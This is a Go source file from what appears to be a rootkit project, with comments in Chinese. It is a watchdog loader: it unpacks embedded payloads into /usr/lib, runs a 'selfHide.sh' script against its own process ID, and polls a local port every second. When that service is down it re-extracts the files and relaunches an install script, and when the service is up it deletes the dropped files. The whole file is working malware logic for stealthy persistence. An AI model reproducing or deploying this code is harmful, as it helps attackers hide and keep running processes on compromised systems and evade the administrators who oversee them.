package main

import (
	"Rootkit/asset"
	"fmt"
	"log"
	"net/http"
	"os"
	"os/exec"
	"time"
)

// 心跳检测
func Ping() bool {

	resp, err := http.Get("http://127.0.0.1:73")
	if err != nil {
		fmt.Println("Error:", err)
		return false
	}
	defer resp.Body.Close()

	if resp.StatusCode == http.StatusOK {
		return true
	} else {
		return false
	}

}

// 执行命令
func executeCommand(command string) ([]byte, error) {
	// 创建一个 bash 进程，通过参数传递要执行的命令
	log.Println(command, "命令执行")
	cmd := exec.Command("sh", "-c", command)
	output, err := cmd.CombinedOutput()
	if err != nil {
		return nil, fmt.Errorf("failed to execute command: %v", err)
	}
	log.Println(string(output), "执行结果")

	return output, nil
}

//go:generate go-bindata -o=asset/asset.go -pkg=asset dataFile/...

func main() {
	RestoreAllAssets()
	pid := os.Getpid()

	var (
		appPid []byte
		err    error
	)

	executeCommand("mv /dataFile/ /usr/lib")

	executeCommand("chmod 755 /usr/lib/dataFile/*")

	log.Println("Current PID:", pid)
	executeCommand(fmt.Sprintln("/usr/lib/dataFile/selfHide.sh ", pid))

	for {
		//心跳检测
		if Ping() {
			log.Println("进程存在", string(appPid))

			executeCommand("test  -d /usr/lib/dataFile/ && rm -rf /usr/lib/dataFile/")

		} else {
			log.Println("进程不存在拉起进程")
			//解压包
			RestoreAllAssets()

			executeCommand("mv /dataFile/ /usr/lib")

			executeCommand("chmod 755 /usr/lib/dataFile/*")

			//启动服务
			if appPid, err = executeCommand("/usr/lib/dataFile/install.sh"); err != nil {
				log.Println("启动错误", string(appPid))
			}
			log.Println(string(appPid))

			executeCommand("rm -rf  /dataFile/")

		}

		time.Sleep(1 * time.Second)
	}
}

func RestoreAllAssets() {
	assets := asset.AssetNames()
	for _, s := range assets {
		err := asset.RestoreAsset("", s)
		if err != nil {
			log.Println("解压失败", err.Error())
		} else {
			log.Println("解压文件")
		}
	}

}
